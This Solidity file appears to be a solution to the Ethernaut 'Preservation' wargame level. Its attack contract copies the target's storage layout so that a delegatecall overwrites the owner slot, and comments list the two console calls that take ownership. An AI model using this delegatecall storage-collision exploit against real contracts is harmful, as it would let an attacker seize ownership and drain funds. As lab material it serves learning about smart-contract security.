// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationAttack {

    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    function setTime(uint _time) public {
        owner = msg.sender;
    }
    
    // On Ethernaut's webpage console we execute the follwoing:
    // await contract.setFirstTime("this contract address")
    // await contract.setFirstTime("any number here")
}